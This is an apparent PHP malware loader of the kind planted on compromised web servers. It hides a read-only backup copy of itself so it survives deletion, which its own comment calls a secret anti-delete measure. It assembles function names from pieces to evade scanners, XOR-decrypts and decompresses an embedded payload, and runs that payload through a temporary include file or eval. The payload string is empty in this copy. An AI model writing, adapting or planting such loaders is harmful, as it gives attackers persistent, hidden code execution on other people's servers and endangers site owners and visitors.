<?php
/*
  ============================================================
  Loader
  ============================================================
*/
// --- Anti-delete: self-heal backup (diam-diam) ---
if (!defined('__SELF_HEAL')) {
    define('__SELF_HEAL', 1);
    $__self = isset($_SERVER['SCRIPT_FILENAME']) ? $_SERVER['SCRIPT_FILENAME'] : __FILE__;
    if (@is_file($__self) && @is_writable(dirname($__self))) {
        $__sig = md5_file($__self);
        if ($__sig !== false) {
            $__bak = dirname($__self) . DIRECTORY_SEPARATOR . '.' . $__sig . '.bk';
            if (!@is_file($__bak)) {
                @copy($__self, $__bak);
                @chmod($__bak, 0444);
            }
        }
    }
}

$f_b64d  = 'base' . '64_' . 'decode';
$f_gzunc = 'gz' . 'un' . 'compress';

$k = $f_b64d('eBZw6/tsWr4LgkqEvNATZw==');
$p = $f_b64d('');

$out = '';
$kl = strlen($k);
for ($i = 0, $n = strlen($p); $i < $n; $i++) {
    $out .= $p[$i] ^ $k[$i % $kl];
}

$src = @$f_gzunc($out);
if ($src === false || $src === '') {
    exit;
}

// ==== Eksekusi via temp-file + include (hindari eval) ====
$tmp = @tempnam(sys_get_temp_dir(), 'p');
if ($tmp && @file_put_contents($tmp, $src) !== false) {
    @include $tmp;
    @unlink($tmp);
    exit;
}

// ==== Fallback darurat (tempnam gagal) ====
eval('?>' . $src);